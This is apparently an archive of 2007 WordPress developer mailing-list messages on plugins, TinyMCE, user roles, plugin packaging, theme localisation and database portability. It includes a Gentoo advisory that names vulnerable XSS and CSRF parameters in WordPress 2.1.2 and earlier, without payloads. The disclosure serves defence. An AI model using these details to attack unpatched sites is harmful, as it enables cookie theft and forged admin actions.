markdown: it is less obtrusive ('''bold''' as opposed to **bold**, 
[http://wordpress.org/ WordPress] as opposed to 
[WordPress](http://wordpress.org/ "Your favorite software")), gets the 
indenting right (writing this after the painful experience of writing 
the readme file for inline gallery), also gets the code blocks and 
blockquotes right.

If there is no such thing yet, I'll slowly start implementing one, it's 
an interesting project idea :)

Message-ID: <69980e7f0703181228q3f3ae54eq20ff60d382257d76@mail.gmail.com>

I was hoping I could find someone to develop a plugin that I'd like to see
(it may not even have to be a plugin, just a page). I don't have the time to
develop this myself, so I was looking for someone to do the ground work.

I've never been overly fond of the basic photography plugins available as it
requires the web server to do the work. The user has to upload the images
and let the plugin do the grunt work. I serve my site from a self-managed
machine because it's easier to maintain. I also have a very powerful desktop
machine that can handle my image processing needs. I want to use f-spot
(more on this later) to manage my image library because it has many of the
features I want (such as tagging, searching, metadata browser) in an
interface that is no where near as clunky as most web based gallery engines.

I posted a bug to the f-spot bugzilla about the details on what could be
done. You can see the bug here:

http://bugzilla.gnome.org/show_bug.cgi?id=412023

This is just a starting point as I think this could be expanded to work with
other desktop image management programs (such as digikam or whatever Abobe
sells). Basic HTML export functionality usually sucks as I want this to
nicely incorporate into my Wordpress blog. This could even be extended to
have a defined system in which to interact with these desktop plugin

If anyone out there has any interest in this, please drop me a line.

I agree; there are some things that are best done by desktop software, 
and photo editing is one of them; I didn't know about f-spot (probably 
because I don't like the idea of a bazillion of gnome services eating 
memory - I already have Firefox and Thunderbird for that - hence I use 
xfce). Is the documentation of the protocols it uses for publishing 
available anywhere (in a shortened version, preferably :))?

I also don't understand very well how f-spot stores metadata; if it 
stores it in the photos, (as God and Adobe intended it to), then the 
only thing to do is a web service that implements one of the protocols 
used by f-spot for publishing, as Inline Gallery reads the said 
metadata; oherwise, a few more function calls are required :)

I haven't looked at Inline Gallery in a while, so I'll try to check it out.
F-Spot imports the images to ~/Photos and uses a sqlite database to store
information about the collection. The example I posted in that bug report
connects to the sqlite3 database and pulls the data from there instead. That
example was meant to pull as much of the database over as possible with the
least amount of work, so I just used the db file. F-Spot, to my knowledge
will store the data in the files as XMP and EXIF comments. I haven't spent
forever looking for documentation (found all that out by just sifting
through the svn code) but f-spot.org is probably a good starting point.

On an unrelated note: xfce is built on Gtk, so it can interact with gnome
applications and do all things gnome. You shouldn't have any troubles
running f-spot under gnome (or kde for that matter).

I looked at Inline Gallery and it seems like way too much work to have
cleanly organized photo albums. I tried fGallery and that seemed to work the
best, but it still suffers from the problem of having too much work done on
the web server (uploading 2GB of pictures through their interface will
always timeout or cause grief). The key feature that I want is something
that is relatively quick (I run from an older machine) and has lightbox and
individual tag support. The reason why I turned to desktop clients for this
is because they almost always handle those features better. F-Spot is a
young project and already can do tags and image manipulation that well
enough.

I would much rather have my desktop do the work than the web server and
lightbox+tag support are the deal making features. I haven't found a plugin
that can do that yet with the least amount of work involved (I don't want to
spend countless hours tying together an organized photo album and I want to
host it all myself).

So the call for the plugin developer still stands. Any takers?

This doesn't really apply to many people, does it?

Most people will be running their own gallery in-tandem with WP on their
server, and use something like WPG2 to connect WP to Gallery2 or maybe to
Coppermine, etc.

Or they use Flickr and the Flickr Plugin....

With Gallery2 you can upload terabytes of data (I tried it :D) at one go!

heh, after looking at comments, it appears that it didn't work out too

I am using the PHP JPEG metadata toolkit to handle XMP, and it pretty 
much does the job, but the code is hideous, most functions output html 
when they don't like something, the author felt an urge to reinvent UTF8 
escaping (all escaping, actually), so rewriting that is high on my 
priority list, if I only could find a few days of feeling like working 
to get it started...

At f-spot.org they say _reading_ xmp and IPTC data is planned and is to 
be included really soon; they say nothing about writing, but I have to 
check the source code. What I was more interested in was the RPC 
protocols they use for publishing to flickr and the like; I'll check to 
see if the gallery remote service from gallery2 can be hacked to work 
stand-alone, or I would need to write the whole implementation from scratch.

Getting Gallery2 to incorporate with WP is cumbersome at best. Way too much
work is required on my end to simply incorporate the galleries due to their
decision to use smarty tags. Again, I want the web server to do as little as
possible because I have a rather under-powered server at the moment and an
over-powered desktop. I would much rather work with a solid desktop
application as it would fit my needs better. Publishing under flickr would
take forever with their 20MB a month limit.

I'd rather not use Gallery or Coppermine as those do not fit my needs, so
lets try to avoid discussing them further.

I have not tested this feature set enough to verify this, however, according
to the F-Spot website (http://f-spot.org/Features):

Photos can be tagged for searching and grouping, and the timeline gives
quick sense of temporal location, and quanity of photos taken. F-Spot can
view and export EXIF and XMP metadata in your images.

I know there is an option to tell F-Spot to export the metadata to the
files, but I haven't really tested that yet (I assumed that's what they were
referring to).

The capabilities of F-Spot is not what I wanted to discuss. I am currently
looking to fill a need by looking for a developer to help me work through
this. This may not be the perfect solution, I would like the option of
managing my photo collection through a desktop application. It would be nice
if this (as of yet) non-existent module could be extended to be generic so
that other desktop tools could export for this plugin. If anyone still wants
to help, please speak up.

This is completely off topic but this doesn't really prove anything much.
The dependencies of f-spot and the current state of your gentoo install
aren't under question here. This really isn't the place to knock on other
products. Use the right tool for the right job; if this is not the right
tool for you, then move on to something else that is but don't waste my time
by trying to convince me that f-spot has too many dependencies.

This module could also be applied to other desktop applications such as
gThumb or digikam.

Hi,

I have something working for an image gallery... it is not exactly a plugin
but it is very easy to setup... All the administration is done trought zen
photo, a custom theme and a plugin to include the galleries.

You can take a look of it at joliwud.com

If you want the code I would be more than happy to share it.

Hi Jason,

If you're looking for commercial help, I'd be happy to discuss further 
off-list.

Cheers,

Subject: [wp-hackers] Plugin to insert a link,
	how do I handle the selected text?
Message-ID: <45FE3775.7080403@callum-macdonald.com>

G'day,

I'm working on a plugin that adds a couple of buttons to the editors 
(using Photopress as a base) and then pops up a list of links to insert 
into the post. However, I can't figure out how to detect if text is 
currently selected in the editor, and if so, wrap the link around that 
text. My current code is:
function pluginInsertLink(linkcode) {
var winder = window.opener ? window.opener : window.dialogArguments;
    if ( !winder ) {
        winder = top;
    }
    tinyMCE = winder.tinyMCE;
    if ( typeof tinyMCE != "undefined" && 
tinyMCE.getInstanceById("content") ) {
        tinyMCE.selectedInstance.getWin().focus();
alert(focusElm);
        tinyMCE.execCommand("mceInsertContent", false, linkcode);
    } else {
        edCanvas = window.opener.document.post.content;
        winder.edInsertContent(edCanvas, linkcode);
    }
}

Does anyone know if the current text is mapped to a javascript variable? 
Do I need to pass it to the popup when the popup is opened?

Or does anyone know of another plugin which does something similar? I'm 
happy to poke about in that code and figure something out.

Cheers,


Callum.

Can't you refer to the original link insertion dialog for TinyMCE?

Hi,

Not sure if anyone else has come across this, but a plugin of mine in the plugin directory has a
subfolder, js, which isn't in the zipfile available for download.  In its place is a file called
'js' of zero bytes.  Might this be a bug in the packaging script?  The plugin is Gengo, but I'm sure
there are lots more that have a similar subdirectory structure.

I think this has also been raised before, but is it intended that the download link will always
package from trunk?  I personally don't want to be answering questions on stuff that's only halfway
finished and not intended for public consumption.  The way redalt used to do this was good, offering
links for each tagged release, along with a trunk link that triggered a javascript confirmation
explaining that it probably wouldn't be supported.

Cheers,

Jamie.

I believe that as of 2.0, users can be assigned to multiple roles (by 
plugins, if not through the user interface), and I think they may be 
able to be assigned capabilities outside of roles as well. So it might 
not make much sense to ask what the current user's role is.

Assuming you are writing a plugin, the right thing to do (as I 
understand it) is to define a capability for your plugin (or use one 
of the built-in capabilities) and ask whether the current user has 
permission to use that capability with the current_user_can function 
(in wp-includes/capabilities.php).

Yepp, providing the trunk as the default download is not a good idea.
Trunk is the latest unstable release for testing, but not suitable for
the most users. I guess for that reason the WordPress download page
doesn't link to the WP SVN trunk, right?

Best regards,

Thanks Jennifer but I am not actually after assigning or retrieving 
capabilities. And if I get multiple roles then that too is fine 
(although as you say this does not seem possible in standard WP). I need 
the role(s) as items in my plugin  can be assigned to roles (not levels 
and not capabilities) including user-defined roles.
 
I am currently making a call to wp_get_current_user() and peeling the 
role from there but it seems like an overloaded, top-heavy structure to 
go and get and I was simply hoping that there might be a simpler built 
in call that I hadn't stumbled across. I have also had one or two users 
who have reported that the role returned from this has been empty 
although this might be something I am doing incorrectly (investigating 
that).

Actually I am keen to get the 'highest level' assigned to a role as well 
(which is easy enough - no problem there) but if there is an inexpensive 
way of getting that I'd also like to know. The old wp_user_level in 
usemeta can not be relied upon to be accurate if some 'role' plugins are 
in use.

So - is there an improvement on using wp_get_current_user() ?
Thanks
Andy

Yes.

>From memory - current_user_can() should provide the functionality you want.

current_user_can() calls has_cap() on the User object which has the
following comment: /has_cap(capability_or_role_name)
(http://trac.wordpress.org/browser/trunk/wp-includes/capabilities.php#L258)

Therefore you should be able to do current_user_can("Administrator");

Thanks - but for that don't you need to either already know the role and 
be interested in a specific capability? I just wish to determine the 
current users 'role(s)' in the first place, in the simplest most 
efficient way possible...

It appears to depend on whether you have any tags defined - and the
latest stable tag marked in your readme.txt file in the trunk.  If
there is no tag identified in this way then the download link (in the
interface) points to trunk.

However, downloading ~download/pluginname.zip *always* appears to
download the trunk file that's available.

I personally would like there to be an option for
~download/pluginname-latest.zip to always point to the latest tag. At
present it is not possible to distribute a always-up-to-date URL that
doesn't point to trunk. Not sure where to file a feature request
though?

All things considered it's still a very good system.

I don't think there is. Check out the code in wp-admin/user-edit.php, 
which seems to be doing something similar to what you are describing.

OK.

----
foreach ($wp_roles->get_names() as $rolename => $roledescription)
{
    if (current_user_can($rolename)) {
        $usersroles[] = $rolename;
    }
}
print_r($usersroles);

Gives you the role(s) that apply to the current user.

In wp-admin/users.php, it looks like we do something like this:

  $user = new WP_User($id);
  $roles = $user->roles; // $roles will be an array

Of course, under the covers, it's querying capabilities, and comparing
them to the list of roles from the '*_user_roles' entry in the options
table.

I have been playing with the updated role-manager (note the hyphen for

I've looked at that, but it's launched as a javascript prompt, not a new 
HTML window. So it exists with all the variables already set. What I'm 
doing is trying to send a command back to the editor from an external 
window. So I can't figure a way to do it relating to the existing insert 
link functions.

Any ideas?

Yes, this is a bug that's being looked at now.  Apologies for the  
inconvenience.

You're in control on this one.  In the readme file in trunk, you  
should specify the "Stable Tag".  You can read all about the readme  
format in the "meta readme file": http://wordpress.org/extend/plugins/ 
about/readme.txt

Downloads for all tags and for trunk are made available:
plugin.zip = trunk
plugin.tagname.zip = tag

The default download (the one you get when you click the "download  
this plugin" button) is the one specified by your trunk readme's  
Stable Tag as above (though this behavior was a bit buggy until  
recently).

plugin.latest.zip is a good idea, and will be implemented... sometime :)

Correct me if I am wrong, but isn't it possible to move a tag with SVN?
So all people would have to do is create a tag named "latest" and move
it whenever they have a new (stable) version ready. This would mean a
little more work for each plugin developer, but it would not require any
changes to the packaging system and it would allow for tagging of beta
version, release candidates and other non-stable releases without the
packaging system having to "filter out" those tags when trying to
determine which tag "latest" actually should be mapped to.

I haven't looked at the Picasa for linux because the last I checked, it was
really still a Windows app that ran under wine. Also from what I can tell,
it exports to either PicasaWeb or Blogger accounts, but I don't know if
there is a format that it exports to. Exporting to Blogger accounts is close
but no cigar; even if it did so in a generic format, I would still need a
page/plugin to be crafted to read the Picasa output (similar to my
suggestion for F-Spot).

I kind of agree with Matt, but if you're going to start playing with the 
default and classic themes again, how about making the two Widget 
friendly "out of the box"? :P I had made up a version of Kubrick before, 
which was basically widget friendly, but since my hard drive crash a few 
months back I lost the copies for it sigh. :(

If I have some free time here soon, I'll work on that again then. Or, if 
in the meantime, someone else could maybe whip one up lol? :P :D /I 
don't know though, maybe that's not so important either..?

Oh yeah, forgot.. I had been getting TONS of hits from the Codex page 
for those trying to find my copy of that Default "widget friendly" 
theme. Only problem is, since I didn't do up another version of it, they 
aren't getting it.. :(

I'd like our bundled themes to support gettext, RTL, widgets, and
custom header images.  We need to set a good example of what themes
should be doing.  Not gettexting the default theme avoided some
support problems at the time, but it has created maintenance problems
with keeping the default up-to-date across all of the translations and
has spawned hundreds of themes that don't use gettext.

It's possible to use tags in this way, but it is sort of contrary to  
accepted SVN practices whereby tags are considered a snapshot in time  
that doesn't change.

The packaging system doesn't do any guesswork when picking the stable  
version.  If you provide a "Stable tag:" meta line in your trunk's  
readme.txt it will use that for the stable version.  If not, /trunk/  
is considered stable.  When you provide a stable tag in your trunk's  
readme.txt, that is the only thing the trunk's readme.txt will be  
used for.  It will essentially act as a pointer to the tag's  
readme.txt information.  This allows you to develop in trunk and  
change your trunk's readme.txt file without worrying that people  
downloading your stable tag are going to see the updated readme.txt

I think plugin.latest.zip is a good idea, as that would allow you to  
link to the "stable download" from an external source and have that  
file be updated as your trunk's readme.txt is updated to indicated  
the latest stable version.  As it is now, you have a moving target,  
and would have to visit the plugin's information page to get the link  
to the latest stable tag.

Ok, I just read the SVN book[1] chapter about tagging and I can see
where this practice comes from. But I do not agree with it 100%. Having
a fixed tag for the latest stable release not only makes it easier for
the packaging system, but for human users that prefer getting their
plugins right from the SVN too without having to know which version
actually is the latest stable version.
And to think another step ahead: it would be possible to reference it
via svn:externals too.
There is even evidence in the SVN book that tags do not *have* to be
snapshots in time, just look at the vendor-branching chapter.
And to pull an analogy: on the www a documents URL should not change
either, still in every blog a lot of URLs point to different documents
depending on when you visit them (and a lot of documents have URLs that
change constantly) - and nobody seems to complain about that.

Of course that is just my opinion :)

This conversation seems secondary to having a system to ~ "one click"
update plugins within the WordPress user experience.

Synopsis
========

Wordpress contains several cross-site scripting, cross-site request forgery
and information leak vulnerabilities.

Background
==========

WordPress is a popular personal publishing platform with a web interface.

Affected packages
=================

    -------------------------------------------------------------------
     Package             /  Vulnerable  /                   Unaffected
    -------------------------------------------------------------------
  1  www-apps/wordpress      <= 2.1.2                      Vulnerable!
    -------------------------------------------------------------------
     NOTE: Certain packages are still vulnerable. Users should migrate
           to another package if one is available or wait for the
           existing packages to be marked stable by their
           architecture maintainers.

Description
===========

WordPress contains cross-site scripting or cross-site scripting forgery
vulnerabilities reported by:

* g30rg3_x in the "year" parameter of the wp_title() function

* Alexander Concha in the "demo" parameter of wp-admin/admin.php

* Samenspender and Stefan Friedli in the "post" parameter of
  wp-admin/post.php and wp-admin/page.php, in the "cat_ID" parameter of
  wp-admin/categories.php and in the "c" parameter of
  wp-admin/comment.php

* PsychoGun in the "file" parameter of wp-admin/templates.php

Additionally, WordPress prints the full PHP script paths in some error
messages.

Impact
======

The cross-site scripting vulnerabilities can be triggered to steal browser
session data or cookies. A remote attacker can entice a user to browse to a
specially crafted web page that can trigger the cross-site request forgery
vulnerability and perform arbitrary WordPress actions with the permissions
of the user. Additionally, the path disclosure vulnerability could help an
attacker to perform other attacks.

Workaround
==========

There is no known workaround at this time for all these vulnerabilities.

Resolution
==========

Due to the numerous recently discovered vulnerabilities in WordPress, this
package has been masked in the portage tree. All WordPress users are advised
to unmerge it.

    
    # emerge --unmerge "www-apps/wordpress"

Subject: [wp-hackers] Latest post from specific catagory
Message-ID: <AEE3DF2E-0CD0-4C20-91CD-E115BA91EA57@rider.edu>

All,

I would like my index.php page to be static in a sense.  My "blog"  
has five categories.  On the index page, I would like the latest post  
in each category to displayed.  Being new to WordPress, I am unsure  
where to start with this.  Can anyone provide with the WordPress code  
neccessary to do what I want.  I.E.:  If I want to get the latest  
post from category 1 and display it, what code is needed?

Any help would be appreciated.

Thanks,
-Rhon

Plus, can we have the Sandbox theme bundled? Sandbox is the most
awesomest theme for re-theming, and I see so many hack-jobs done based
on Kubrick it's not funny. It would be really great to see Sandbox
included with WP; not as the default theme, just bundled, to increase
visibility.

Sorry for the slow response, but just wanted to say thanks for looking into this.

Excellent, thanks.  The readme format I was using was over a year old from when Matt initially
raised the possibility!

Or to look at it another way, hundreds of themes were created that 
wouldn't have been if the default was gettexted.

Branches work fairly well for this.

Not really.  The themes out there were mostly created to fill a design gap, not a language gap.
Hundreds of different themes would have still been created, but they would have followed the
default's good example and been designed with localisation in mind.  Or would everyone have stuck
with the same design, just because it could be translated?  Unless you mean hundreds of copies of
the same theme, which I can't imagine is a good thing.

Localising the default theme is a good idea.

Cheers,

Jamie.

We've fixed up a few bugs introduced by clean_url(), and I just fixed
a bug where we weren't properly checking the publish caps when editing
posts via XMLRPC.  We need to test XMLRPC editing and posting for both
the blogger and MW APIs, and we still need testing and feedback on the
previous round of changes.  Click around the admin to make sure
clean_url hasn't broken any links.  The broken links in the uploader
and in the edit users page should be fixed now, but other broken links
may still be lurking.

2.0 needs some auditing love.  It does have nearly as many calls to
attribute_escape() and clean_url() as 2.1 and trunk do.  If anyone has
time to help with a file by file audit, please dive in.  Compare each
file in 2.0 versus their 2.1 counterparts and identify missing
sanitization.

At this point we're kind of back to beta status, but if we can get
some auditing and testing done today and tomorrow we can put out RC3.

Subject: [wp-hackers] Annotation plugin: looking for help
Message-ID: <1174525284.4907.8.camel@joel-laptop>

I'm looking for help from an experienced WP plugin author in creating an
annotation plugin. I have a very clear idea of what exactly must be
done, I just need some help from a sympathetic party to get there.

The plugin will be based on the existing Marginalia code, and will
feature the ability for (authenticated) users to select an arbitrary
range of text and give a small side comment about it. This comment will
be displayed in a sidebar.

Marginalia: http://code.google.com/p/marginalia/

The system will consist of:

* A bit of Javascript from the Marginalia project (handles selection,
display, UI, etc.; already complete)
* A theme with an open sidebar (just an appropriate <div>, pretty much)
* Backend code (the WP plugin) that sits between the JS and the DB

The plugin will need to do the following things:

* Insert a bit of formatting into an article when submitted (just some
<divs>)
* Do a store/edit/retrieve function with the DB
* Make sure user authentication is honored (check rights, etc.)

The ultimate goal will be a public site allowing annotations of
user-submitted documents.

If you're interested, let me know.

Thanks,

I remember there was something like this that used the Yahoo! JS library
that allowed blog comments to be attached to paragraphs in the post.

See if this is anything like you want, even though it doesn't use
Marginalia:

I'm saying that wrapping every string in PHP is very, very offsetting 
for a large class of people, which happens to overlap a lot with the 
folks who make themes.

I think it would not be asked too much from a designer to wrap some PHP
around their strings.

In fact, if you provide a properly internationalized default theme, you
allow theme authors to reach a much larger audience. And you would
increase the choice of themes for non-English WP users. The best would
even be to include theme-specific language files, so people learn how to
use language templates. Learning doesn't hurt, does it?

Alex

Anyone know a way (hook) to add CSS to the WordPress Plugin's CSS file (
wordpress.css) via a plugin? Now that the dropdown comes as an easter egg I
want to be able to add the css with a plugin rather than replacing the file
after every upgrade.

Anything you want to add to TinyMCE should be added via one of the
hooks/filters in tiny_mce_config.php. Use the mce_css filter to
replace wordpress.css or use tinymce_before_init to echo some of your
own javascript which will execute prior to tinyMCE.init.

The latter method is the most powerful. You can replace any tinyMCE
function with your own code.

Hi

my name is Juan Manuel Doren, I?m a chilean engineer working in a lot
of sites with several thousand of visitors every day.

I just decided to use wordpress as my core dms system and contribute
to the core development

as a newbie in this list i have a lot of questions..... the first one is this:

Why wp and wpmu are two different products?
I think wpmu can be used as a the core system if we  think wp as an
special case of a multi blog site with only one blog active, so we
have only one project to mantain

i ask this because i would like to work improving wpmu, but i'm
affraid to waste my work if wp core changes

what do you think about this?

Callum,

Any luck with this?  I've been wondering the same thing for TinyMCE on 
WP 2.1.x and WPMU 1.1.1 using a plugin and not editing the core code. 

My needs are to highlight text in the editor, click on my custom button 
and then that would wrap the selected text with some code. 

Something like...

<div class='myClass'>The selected text from TinyMCE</div>

...this is easy to do in the "code" editor, but TinyMCE has yet to work 
for me.

If anyone knows how to go about this, I'd be extremely grateful.

Brian

You can do it with a custom plugin for TinyMCE. The key functions would be
mceInsertContent and {instance}.selection.getSelectedText(). My best advice
would be to download the full TinyMCE package and take a look at the advlink
plugin, since this basically does the same thing.

The answer seems to be at least partly philosophical

It takes a lot of extra stuff to make wpmu do what it does.  The folks here
are rather in agreement that keeping WP small, clean, and fast is a high
priority.  For your special case of one active blog, wpmu has quite a bit of
stuff included in it that would simply be chaff.

Chaff decreases the accessibility of the source to new contributors, it
complicates extension as there are more moving parts to potentially
interrupt, and requires more care with regard to security.

All of this is beside the fact that it bloats the product.

If you want to contribute to wpmu, keeping up on the wpmu hackers list is an
easy decision.  Keeping an eye on the core svn list might also be a good
idea, but there are relatively few things that are changed in the core very
haphazardly.  WP core code has done a /reasonable/ job of being marked as
deprecated before it is broken irrevocably (with a couple of notable
exceptions--oops).

These can return WP_Error objects.  Casting to int breaks them.  I
don't think we should cast to int return values from our own
functions.  They should return an int or WP_Error as appropriate.

Welcome to the community!

There are no plans to merge WPMU with WP on the roadmap, however they 
are very closely tied together. They share 98%+ of their code and MU 
follows WP so if you're looking to contribute to the core functionality 
of WordPress, this is the place to be.

There is no equivalent list for MU hackers right now, so this is also 
the right place to discuss something which might touch both codebases, 
but if that discussion expands much we'll want to move it to a separate 
list.

I wouldn't think so either! But, historically, it has been, and we 
should recognize the fact and work within those constraints rather than 
making the same mistakes over again.

Subject: [wp-hackers] Plugin directory zip issue
Message-ID: <4603454B.2010407@kuykendall.org>

In the last couple of days I have gone ahead and moved podPress to the 
wordpress.org plugin directory, so that I can try and participate more 
with the plugin community.
Most things are working nicely, the readme.txt solution is pretty handy.

Anyways, I recently release version 7.7 of my plugin, so the download 
link is now for http://downloads.wordpress.org/plugin/podpress.7.7.zip

This is all well and good, except that when you unzip this, you get a 
'podpress.7.7' directory. I used to have a naming scheme very similar 
naming scheme (podpress-7.7.zip). However I was zipping the dir to be 
'podpress' as it should be.
I released version 7.7 last night, and already this issue with the dir 
being named 'podpress.7.7' has resulted in about 20 users posting on my 
forums, emailing me directly, or IM'ing me about podpress not installing 
properly. Most of these were new users, most of my existing users 
realized they needed to rename the dir, but the new users dont.

Is anyone else having this problem?

Can someone involved with the plugin dir look into naming the dir after 
the plugin, rather than using plugin.tag? The zip file name doesnt need 
to change, just the dirname inside it. Im willing to do the code if 
someone wants to pass along the file driving this.

Though generally, it sounds like you are correct, it seems like there
is likely an immediate work around. My guess it is just a matter of
doing something a little different in the readme file, neither Akismet
nor Subscribe to Comments include the version in the zip file name.

It looks like akismet doesn't use a readme.txt file and Subscribe to
Comments points the stable tag at "trunk".  Is this why it's behaving like
that?

Message-ID: <d5f60f0c0703222054j39b74ff6i8f3b4914057766d7@mail.gmail.com>

Hello,

today I was browsing through the list of mentoring organisations,
participating in Google Summer of Code, and luckily found WordPress there.
And then I reminded myself an idea I have thought of some time ago: to
develop PostgreSQL port of WordPress. I would like to hear some opinions
from the community: what do you think of this idea?

I have read some discussions on this mailing list on this topic, and found
that I am not the only person interested in the port, and that there are
already intensions being made towards multi-database support both in default
WordPress (removing enums from database, etc) and fork projects.

I already have a rough list of things to be done, and would gladly discuss
it if there's anyone interested.

Thank you Matt and Steve!

my first goal is to use WP to manage several sites, but with just one
installation.

I used to start my own codes with somethink like
if ( gentenv( 'HOST_NAME' ) == 'example.com' )

... yeah, this is just an example, I really use a hosts table on the
database!  ;-)

this allows me to share only one list of users, i have one database to
backup, can share some resources across all my sites network ( images,
videos, css and others )

can you recommend me some documentation to read, or some plugin to
look for this purpose?

I decided to start working on WP and forget ( for a while ) WPMU, I
hope to make some contributions in a short time


my regards

  J M

The problem with using the non-versioned
http://downloads.wordpress.org/plugin/podpress.zip is that this is the
trunk code. I like to be able to pass code back and forth between dev
installs, and other developers using svn, so really dont want users
always getting the latest code that way.

Correct. This delivers the trunk code.

There's a fellow (dave cramer) who has an email address at 
postgresintl.com who announced a port about 10 days back...  Before 
looking at it for SoC, well worth knowing whether there's actually a big 
enough project left, etc.

A better project would be to make WP be multi-database compatible. Maybe
even make it more extendable so other people would be able to make there own
DB ports be simply making up a file. I'm sure you could use classes and
functions to produce this (such as, make a function called db_insert(), and
then in a file go:

function db_insert(stuff) {
//database query stuff here for inserting data
}

and then others. Then, make an option for which DB you want to use in
wp-config.php and make a folder where the files for the different DBs would
go to in like wp-includes/db [or something])...

Yep, David and I are working on the port.. It's mostly done, there are just a couple of kinks that need sorting out here and there.

I haven't heard from him for a while though, time to drop him an email :)

Matt, there was this plugin I came across for WP 1.5, and it sounds interesting.
Instead of rewriting db.php, this plugin instead uses PREG to replace queries on the fly.....

*searches for link*

http://elizabethmariesmith.com/?p=19

Her plugin is decent, I downloaded a copy of WP 1.5.2 and it had some glitches, but it WORKED....

Do you have any idea if this kind of system COULD be implemented via a plugin for WP 2.1.x?

Technically, this would address ALL the issues raised regarding plugin DB-access structure, non-ANSI functions, etc.....

Doing a replace of the queries on the fly wouldn't be preferable. It would
be laggy and slow down the page loading time. I like the way I mentioned,
that way people can just go and make a file with different functions in it
and then put the appropriate DB queries inside the functions. Maybe there's
another way of doing it though...

I'm just worried about the Plugins... because as others noted, most will access the DB directly without using the API.

However, you could just remove external access to the DB, I guess that would force them to use the API...

You guys might want to take a look at IPB, I haven't seen it for myself, but from what I know, it's just one php file they call a database "driver" that needs replacing..

Well, plugins will be a problem, we'll just have to better encourage plugin
creators to use the API. Besides, then people wouldn't have to worry about
insecure queries in plugins. :P

As for just a driver file needed, that basically what I mean. Just have a
file for different DBs. Like, wp-db-mysql.php, wp-db-oracle.php,
wp-db-postgresql.php, etc.

I don't agree with that logic.  Do you have some supporting evidence
that themes wouldn't have been created if the default theme was
gettexted?

The issue that themes don't follow the language setting for the rest
of WordPress comes up often with the Finnish users.

I think it would be just as easy to use the example provided by the
default theme if it was gettexted.  I think it would also result in
themes that support I18N much better, not splitting up phrases.

It's not working.

/*********************************************************
if ( stristr( $_SERVER['REQUEST_URI'], 'feed' ) != FALSE )
	add_filter( 'the_content','NST_CheckRSS' );
*********************************************************/

/*********************************************************
if ( is_feed() )
	add_filter( 'the_content','NST_CheckRSS' );
*********************************************************/

The first code sample - the old code - works just fine. The new code
doesn't.

Requests made to http://server/wordpress/?feed=rss2 _aren't_ kicking off
is_feed()
Nor requests to http://server/wordpress/feed/ or anything else for that
matter.

Tested on WP 2.1 Branch and WP Trunk.

What if you add the filter unconditionally and use is_feed()
in the filter function?  That should be late enough that
is_feed() already knows to return the right value.

Using a combination of all of the howtos I could find, I did eventually 
get it working. It's not quite perfect, I pass the selected text to the 
popup as a GET variable and then insert it via PHP to the javascript 
functions. But at least it works.

The article on maxpower is good, and it relates to buttonsnap.php which 
is a great help, but it doesn't work in the Code view of the Rich 
Editor. To get that working as well required some further fiddling. 
Happy to post my code somewhere if it would be useful.

Cheers,


Callum.

Sorry, it *does* work, but there is another problem.

Like my original code, is_feed() evaluates as true if the word "feed"
appears in the permalink. :(

So now I use is_feed() && !is_single() && !is_home() && !is_page()

Subject: [wp-hackers] Weird add_filter() glitch: PHP crashes
Message-ID: <003801c76d26$ceace290$6c06a7b0$@net>

Setting the priority of my filter to anything other than 10 or blank crashes
FastCGI:

 

add_filter( 'the_content', 'NST_CheckRSS'); //This works

add_filter( 'the_content', 'NST_CheckRSS', 1); //This crashes:

 

FastCGI Handler Extension 

Error 0x80004005 occurred processing request. 

 

The FastCGI process exited unexpectedly

 

 

It's not a timeout error and my filter isn't calling on itself over and over
again (I remove the filter then add it after apply_filter())

 

Has anyone seen this problem before?

Glad to hear that the port is near completion. What especially needs to be
done? Is there a way for me to contribute to the project?

Agreed on this. Although I understand that's its hard to add and keep
cross-database compatibility in case
application uses some of the advanced database-specific features, it
shouldn't be the case for WordPress. Most of the MySQL-isms could be
rewritten using the standard syntax, not shortening the list of
database
features that can be used. An exception from this rule are the queries
that need to get a certain part of result rows,
what is incosistent across
databases. In MySQL, one can use both "LIMIT a, b" and "LIMIT b OFFSET
a" syntaxes. By changing queries to use the second way would add
PostgreSQL compatibility, without loosing any features. However, in
order to support other databases, some abstration function would have
to be written.
 It would be nice if the common (the one that will work on PostgreSQL, but
won't stop it working on
MySQL) changes from PostgreSQL port could be applied to the main source tree.


Talking of SoC, I have another database-related idea. What I'd like to do is
to add support for sharing the same set of tables by many blogs in WordPress
MU. So far, point of view on this approach has been the main difference
between WordPress MU and Lyceum. While Lyceum developers choose to change
every query to implement this, I am suggesting to do it on database side.
That way we would get benefits of both approaches:

1) keeping the changes in WordPress source code minimal;
2) make it have a good scalability;
3) comfortable to manage, no need to run a query on each user's table
to add an extra field;
4) support WordPress plugins with no, or almost no, changes;

As a downside, I can mention that in order to implement this, triggers and
views would have to be used, thus, it would need at least MySQL 5.0 in
order to run. But, I don't think that this is a problem as most of the
blog hosting services would run on dedicated servers, where service
owners can install whatever MySQL version they prefer. And also, we
can keep this as an option, leaving the choice of approach to be used
to the end user.
What do you think?

As Matt said, this isn't the solution. The solution is to make  
wordpress database agnostic. Now that is a job worthy of tackling for  
the google SOC.

Either way the one thing we haven't solved is replacing  
mysql_count_rows. Which I suspect can be done by simply doing select  
count(*)

take a look on http://pear.php.net/package/MDB2

i think is a good idea using some think like this

function wp_select( $columns, $tables, $where, $order, $limit1, $limit2 )


and there are two choices

1) include different files with functions
switch( database_type()  )
{
    case ORACLE:
    {
        include ( 'oracle_functions.php' );

....


2)

have a smart select function

function wp_select( $columns, $tables, $where, $order, $limit1, $limit2 ){

 switch ( database_type() )
 {
      case MYSQL:
      case SOME_OTHER_DATABASE_LIKE_MYSQL
       {
           $query = sprintf( 'SELECT ............ )

.....



I think the second one is better, because the wp_select will be
available for all
the plugins

Have all of the mentors registered?  I assume all of them are on this
list... 
http://code.google.com/soc/mentor_home.html

There are applications to vote on and offer opinions on..
http://code.google.com/soc/wordpress/open.html

Right now it just looks like Lloyd and myself making comments.  GSOC
recommends two mentors for each student to help share the load and provide
better access for the students when help is needed.  Right now, I'm not
seeing a level of participation from the mentors to support that...

It takes a couple days to process the registration.  Once joined, I believe
we are supposed to join the Mentor list in order to get communications from
Google:
http://groups.google.com/group/google-summer-of-code-mentors-list

Heck, you at least get a free T-Shirt out of the deal this way...

I have personally spoken to all but one of the mentors, and don't know
that it is good use of
every mentors time to do initial screening. There are also a few more
days to submit applications. I have been following up with students to
encourage they submit the strongest application they can.

No, it seems to happen immediately.

I had a day and a half wait as the mentor application was pending.

Just as my membership to the mentor "google group" is pending atm.

Your experience must have differed from mine.

That was because it was sitting with me ;-)

Good idea. I think, it would be the best to make WordPress use ActiveRecord
pattern, but it would need more time and effort.

Also, we will have to avoid using backticks for field names and single
